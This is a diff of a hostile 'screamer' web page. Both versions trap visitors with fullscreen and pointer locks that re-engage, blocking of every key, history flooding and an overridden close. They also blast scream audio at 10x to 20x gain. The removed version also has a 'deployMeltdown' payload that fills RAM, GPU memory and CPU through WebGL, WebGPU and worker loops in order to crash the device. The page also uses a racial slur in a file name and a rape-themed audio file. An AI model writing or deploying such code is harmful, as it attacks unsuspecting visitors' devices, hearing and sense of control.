@@ -8,40 +8,126 @@
       gtag('js', new Date());
       gtag('config', 'UA-149452514-1');
     </script>
+    <link rel="stylesheet" type="text/css" href="styles.css">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-validate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-    <style>
-        * { padding: 0; margin: 0; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
-        body, html { overflow: hidden; height: 100%; width: 100%; background: #000; cursor: none; }
-        .video-container {
-            position: fixed;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            display: flex;
-            flex-direction: row;
-            align-items: center;
-            justify-content: space-between;
-            z-index: 1000;
-        }
-        .video-wrapper { width: 640px; height: 480px; position: relative; flex-shrink: 0; }
-        .video-wrapper video, .video-wrapper img { width: 100%; height: 100%; object-fit: contain; position: absolute; top: 0; }
-        .video-divider { width: 2px; height: 480px; background: red; flex-shrink: 0; }
-        .click-overlay {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999999;
-            cursor: pointer; display: flex; justify-content: center; align-items: center;
-        }
-        .click-overlay button { padding: 20px 40px; font-size: 20px; background: #fff; color: #000; border: none; cursor: pointer; }
-        .black-screen { background-color: black; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999998; }
-        .backg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        .backg img { width: 100%; height: 100%; object-fit: cover; opacity: 0.3; }
-    </style>
+    <!-- PUT THE ADSENSE SCRIPT HERE -->
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3026390331916120"
+         crossorigin="anonymous"></script>
+
+<style>
+* { 
+    padding: 0; 
+    margin: 0; 
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+}
+
+body, html {
+    overflow: hidden;
+    height: 100%;
+    width: 100%;
+    background: #000;
+    cursor: none;
+}
+
+.video-container {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    justify-content: space-between;
+    z-index: 1000;
+}
+
+.video-wrapper {
+    width: 640px;
+    height: 480px;
+    position: relative;
+    flex-shrink: 0;
+}
+
+/* Style both video and img elements inside the wrapper */
+.video-wrapper video,
+.video-wrapper img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    position: absolute;
+    top: 0;
+}
+
+.video-divider {
+    width: 2px;
+    height: 480px;
+    background: red;
+    flex-shrink: 0;
+}
+
+.click-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    z-index: 9999999;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.click-overlay button {
+    padding: 20px 40px;
+    font-size: 20px;
+    background: #fff;
+    color: #000;
+    border: none;
+    border-radius: 0;
+    cursor: pointer;
+}
+
+.black-screen {
+    background-color: black;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    z-index: 9999998;
+}
+
+.backg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 1;
+}
+
+.backg img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    opacity: 0.3;
+}
+</style>
 </head>
 <body>
 
-<div class="click-overlay" id="startOverlay"><button>☢️ ENTER HELL</button></div>
+<!-- Click anywhere on overlay to start (button is just visual) -->
+<div class="click-overlay" id="startOverlay">
+    <button>ENTER</button>
+</div>
 <div class="black-screen"></div>
 
 <audio id="shart" preload="auto" loop src="scream.mp3"></audio>
@@ -49,12 +135,20 @@
 <audio id="shart3" preload="auto" loop src="rape.mp3"></audio>
 
 <div class="video-container">
-    <div class="video-wrapper"><img id="wads" src="wads.gif" alt=""></div>
+    <!-- Third element: wads.gif (as an image, not a video) -->
+    <div class="video-wrapper">
+        <img id="wads" src="wads.gif" alt="">
+    </div>
     <div class="video-divider"></div>
-    <div class="video-wrapper"><video id="fart" loop src="zzart.mp4" playsinline></video></div>
+    <div class="video-wrapper">
+        <video id="fart" loop src="zzart.mp4" playsinline></video>
+    </div>
     <div class="video-divider"></div>
-    <div class="video-wrapper"><video id="ronnie" loop src="ronnie.mp4" playsinline></video></div>
+    <div class="video-wrapper">
+        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
+    </div>
 </div>
+
 <div class="backg"><img src="naggars.gif"></div>
 
 <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
@@ -64,15 +158,18 @@
     const ORIGINAL_WIDTH = 640;
     const ORIGINAL_HEIGHT = 480;
 
-    // --- AUDIO BOOST (20x Volume) ---
-    let audioContext, gainNode;
+    // --- AUDIO BOOST (Web Audio API) ---
+    let audioContext;
+    let gainNode;
     const mediaElements = [];
+
     function initAudioBoost() {
         audioContext = new (window.AudioContext || window.webkitAudioContext)();
         gainNode = audioContext.createGain();
-        gainNode.gain.value = 20; // DOUBLED from original 10 -> 20x ear-bleed
+        gainNode.gain.value = 10; // 10x volume
         gainNode.connect(audioContext.destination);
 
+        // Connect all audio elements
         const audioIds = ['shart', 'shart2', 'shart3'];
         audioIds.forEach(id => {
             const el = document.getElementById(id);
@@ -84,6 +181,8 @@
                 el.muted = false;
             }
         });
+
+        // Connect video elements only (wads is an image, so exclude it)
         const videoIds = ['fart', 'ronnie'];
         videoIds.forEach(id => {
             const el = document.getElementById(id);
@@ -98,235 +197,124 @@
     }
 
     function playAllMedia() {
-        if (audioContext && audioContext.state === 'suspended') audioContext.resume();
+        if (audioContext && audioContext.state === 'suspended') {
+            audioContext.resume();
+        }
         mediaElements.forEach(m => {
             if (m) {
                 m.volume = 1.0;
                 m.muted = false;
                 const playPromise = m.play();
-                if (playPromise !== undefined) playPromise.catch(() => setInterval(() => m.play(), 50));
+                if (playPromise !== undefined) {
+                    playPromise.catch(() => {
+                        setInterval(() => m.play(), 100);
+                    });
+                }
             }
         });
     }
 
-    // --- HARDCORE ESCAPE PREVENTION ---
+    // --- FULLSCREEN LOCK ---
     function attemptFullscreen() {
         const elem = document.documentElement;
-        if (elem.requestFullscreen) elem.requestFullscreen().catch(()=>{});
+        if (elem.requestFullscreen) elem.requestFullscreen();
         else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
         else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
         else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
     }
 
+    // --- POINTER LOCK ---
     function lockPointer() {
-        if (document.body.requestPointerLock) document.body.requestPointerLock().catch(()=>{});
+        if (document.body.requestPointerLock) {
+            document.body.requestPointerLock();
+        }
     }
 
+    // --- HISTORY FLOOD ---
     function floodHistory() {
-        for (let i = 0; i < 50; i++) history.pushState(null, null, location.href);
+        for (let i = 0; i < 20; i++) {
+            history.pushState(null, null, location.href);
+        }
     }
 
-    function blockKeys(e) { e.preventDefault(); e.stopPropagation(); return false; }
+    // --- KEY BLOCKING ---
+    function blockKeys(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }
 
+    // --- RE-ENGAGE LOCKS ---
     function reengageLocks() {
         if (hasTriggered) {
-            if (!document.fullscreenElement && !document.webkitFullscreenElement) attemptFullscreen();
-            if (!document.pointerLockElement) lockPointer();
+            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
+                attemptFullscreen();
+            }
+            if (!document.pointerLockElement) {
+                lockPointer();
+            }
         }
     }
 
-    // --- STEAL FOCUS BACK (Mobile/Desktop Tab switching) ---
-    function stealFocus() {
-        if (document.hidden) {
-            // Try to refocus the window
-            window.focus();
-            // If we are on mobile and hidden, try to vibrate/alert to force attention
-            if (navigator.vibrate) navigator.vibrate(1000);
-            // Also reload the page if we lose focus to prevent user from escaping to settings
-            // But reloading might stop the crash, so we just spam focus.
-            setTimeout(() => window.focus(), 10);
-        }
-        if (!document.fullscreenElement) attemptFullscreen();
-        floodHistory();
-    }
-
-    // --- THE ADAPTIVE SYSTEM MELTDOWN (Crashing Payload) ---
-    function deployMeltdown() {
-        console.log('[ARMAGEDDON] Deploying system-killer...');
-        const log = (msg) => { console.log(msg); };
-
-        // 1. Detect device
-        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-        const isAndroid = /Android/i.test(navigator.userAgent);
-
-        // 2. Probe WebGL2
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl2');
-        let texSize = 4096;
-        if (gl) texSize = Math.min(gl.getParameter(gl.MAX_TEXTURE_SIZE), isMobile ? 8192 : 16384);
-        const gbPerTex = (texSize * texSize * 4) / 1024**3;
-
-        let numTextures = isIOS ? 12 : (isAndroid ? 20 : 8);
-        // On desktop, if texSize is 16k, 6 textures = 6GB VRAM. If 8k, 12 textures = 3GB.
-        if (!isMobile && texSize >= 16384) numTextures = 6;
-        else if (!isMobile && texSize >= 8192) numTextures = 12;
-        
-        log(`[MELTDOWN] Tex: ${texSize}, Count: ${numTextures}, VRAM Target: ${(numTextures * gbPerTex).toFixed(2)}GB`);
-
-        // 3. Spawn Workers
-        const workerCode = `
-            const TEX_SIZE = ${texSize};
-            const NUM_TEX = ${Math.min(6, Math.ceil(numTextures / 2))};
-            let ramSize = ${isMobile ? '0.8' : '2.0'} * 1024**3;
-            try {
-                const buf = new ArrayBuffer(ramSize);
-                const view = new Uint8Array(buf);
-                for (let i = 0; i < view.length; i += 4096) view[i] = 0xFF;
-                self.__ram = view;
-            } catch(e) {}
-            try {
-                const c = new OffscreenCanvas(TEX_SIZE, TEX_SIZE);
-                const gl = c.getContext('webgl2', { alpha: false, depth: false });
-                if (gl) {
-                    const pixels = new Uint8Array(TEX_SIZE * TEX_SIZE * 4);
-                    for (let i = 0; i < pixels.length; i += 4096) pixels[i] = 0xFF;
-                    for (let i = 0; i < NUM_TEX; i++) {
-                        const tex = gl.createTexture();
-                        gl.bindTexture(gl.TEXTURE_2D, tex);
-                        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, TEX_SIZE, TEX_SIZE, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
-                        gl.generateMipmap(gl.TEXTURE_2D);
-                    }
-                }
-            } catch(e) {}
-            let x=0, y=1;
-            const arr = new Float64Array(1024);
-            while(true) {
-                for (let i=0; i<1000000; i++) { x += Math.sin(y)*Math.cos(x); y += Math.tan(x)*0.0001; }
-                for (let i=0; i<arr.length; i++) arr[i] = (x+y)*(i%100);
-                if (x>1e15) x=0;
-            }
-        `;
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        const url = URL.createObjectURL(blob);
-        const cores = Math.min(navigator.hardwareConcurrency || 4, 12);
-        for (let i = 0; i < cores; i++) {
-            try { const w = new Worker(url); window['_w'+i] = w; } catch(e) {}
-        }
-
-        // 4. Main Thread Textures + RAM
-        if (gl) {
-            const mainPixels = new Uint8Array(texSize * texSize * 4);
-            for (let i = 0; i < mainPixels.length; i += 4096) mainPixels[i] = 0xFF;
-            for (let i = 0; i < numTextures; i++) {
-                try {
-                    const tex = gl.createTexture();
-                    gl.bindTexture(gl.TEXTURE_2D, tex);
-                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, texSize, texSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, mainPixels);
-                    gl.generateMipmap(gl.TEXTURE_2D);
-                    window['_t'+i] = tex;
-                } catch(e) { break; }
-            }
-            gl.clearColor(1,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT);
-        }
-
-        // 5. Main Thread RAM (4GB Desktop / 1.2GB Mobile)
-        try {
-            const ramSize = isMobile ? 1.2 * 1024**3 : 4 * 1024**3;
-            const buf = new ArrayBuffer(ramSize);
-            const view = new Uint8Array(buf);
-            for (let i = 0; i < view.length; i += 4096) view[i] = 0xFF;
-            window._mainRam = view;
-        } catch(e) {}
-
-        // 6. WebGPU (Desktop)
-        (async function() {
-            try {
-                const adapter = await navigator.gpu?.requestAdapter();
-                const device = await adapter?.requestDevice({ requiredLimits: { maxBufferSize: 2*1024**3, maxTextureDimension2D: 16384 } });
-                if (device) {
-                    device.createBuffer({ size: 2*1024**3, usage: GPUBufferUsage.STORAGE });
-                    device.createTexture({ size: [16384,16384,1], format: 'rgba8unorm', usage: GPUTextureUsage.RENDER_ATTACHMENT });
-                    const shader = device.createShaderModule({ code: `@compute @workgroup_size(64) fn main() { loop {} }` });
-                    const pipeline = device.createComputePipeline({ layout: 'auto', compute: { module: shader } });
-                    const encoder = device.createCommandEncoder();
-                    const pass = encoder.beginComputePass();
-                    pass.setPipeline(pipeline); pass.dispatchWorkgroups(1); pass.end();
-                    device.queue.submit([encoder.finish()]);
-                }
-            } catch(e) {}
-        })();
-
-        // 7. FINAL LOCK: Synchronous infinite loop to freeze UI.
-        setTimeout(() => {
-            let z=0; const tmp = new Uint8Array(4096);
-            while(true) {
-                z += Math.sqrt(Math.random()) * Math.sqrt(Math.random());
-                if (z > 1e15) z = 0;
-                for (let i=0; i<tmp.length; i++) tmp[i] = (z * i) & 0xFF;
-            }
-        }, 1000);
-    }
-
-    // --- START BUTTON ---
+    // --- START FUNCTION ---
     window.startExperience = function() {
         if (hasTriggered) return;
         hasTriggered = true;
 
-        document.getElementById('startOverlay').style.display = 'none';
-        document.querySelector('.black-screen').style.display = 'none';
+        const overlay = document.getElementById('startOverlay');
+        const blackScreen = document.querySelector('.black-screen');
+        if (overlay) overlay.style.display = 'none';
+        if (blackScreen) blackScreen.style.display = 'none';
 
-        // Attack 1: Sensory Overload
         floodHistory();
         initAudioBoost();
         playAllMedia();
         attemptFullscreen();
         lockPointer();
 
-        // Attack 2: System Meltdown (CRASH)
-        deployMeltdown();
+        setInterval(reengageLocks, 200);
 
-        // --- IMPOSSIBLE ESCAPE ROUTINES ---
-        setInterval(reengageLocks, 50); // Check locks 20x per second
-        setInterval(stealFocus, 100);   // Steal focus back 10x per second
-        setInterval(floodHistory, 200); // Flood history constantly
+        const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
+        events.forEach(eventType => {
+            document.addEventListener(eventType, reengageLocks, true);
+        });
 
-        // Listen to events that indicate user trying to escape
-        document.addEventListener('visibilitychange', stealFocus);
-        window.addEventListener('blur', stealFocus);
-        window.addEventListener('focus', () => { attemptFullscreen(); lockPointer(); });
+        document.addEventListener('fullscreenchange', reengageLocks);
+        document.addEventListener('webkitfullscreenchange', reengageLocks);
+        document.addEventListener('mozfullscreenchange', reengageLocks);
+        document.addEventListener('MSFullscreenChange', reengageLocks);
 
-        // Block ALL keys
+        document.addEventListener('pointerlockchange', reengageLocks);
+        document.addEventListener('mozpointerlockchange', reengageLocks);
+        document.addEventListener('webkitpointerlockchange', reengageLocks);
+
         document.addEventListener('keydown', blockKeys, true);
         document.addEventListener('keyup', blockKeys, true);
         document.addEventListener('keypress', blockKeys, true);
-
-        // Block right-click, drag, selection
-        document.addEventListener('contextmenu', e => e.preventDefault(), true);
-        document.addEventListener('dragstart', e => e.preventDefault(), true);
-        document.addEventListener('selectstart', e => e.preventDefault(), true);
-
-        // Trap back button / popstate
-        window.onpopstate = function() { 
-            floodHistory(); 
-            location.reload(); // If they manage to pop, reload to reset the trap
-        };
-
-        // Unclosable prompt
-        window.onbeforeunload = function() {
-            return "⛔ SYSTEM LOCKED. DO NOT LEAVE.";
-        };
-
-        // Override close
-        window.close = function() { location.reload(); };
-
-        console.log('☢️ APOCALYPSE DEPLOYED. SYSTEM WILL CRASH SHORTLY.');
     };
 
     document.getElementById('startOverlay').addEventListener('click', startExperience);
-    // Auto-start if the user accidentally clicks anywhere else
-    document.addEventListener('click', startExperience);
 
+    document.addEventListener('contextmenu', e => e.preventDefault(), true);
+    document.addEventListener('dragstart', e => e.preventDefault(), true);
+    document.addEventListener('selectstart', e => e.preventDefault(), true);
+
+    window.onbeforeunload = function() {
+        return "Are you absolutely sure you want to leave?";
+    };
+
+    window.close = function() {
+        console.warn('Nice try.');
+    };
+
+    window.onpopstate = function() {
+        if (hasTriggered) {
+            floodHistory();
+            reengageLocks();
+        }
+    };
+
+    // No resize function needed – container sizes automatically
 })();
 </script>
 </body>
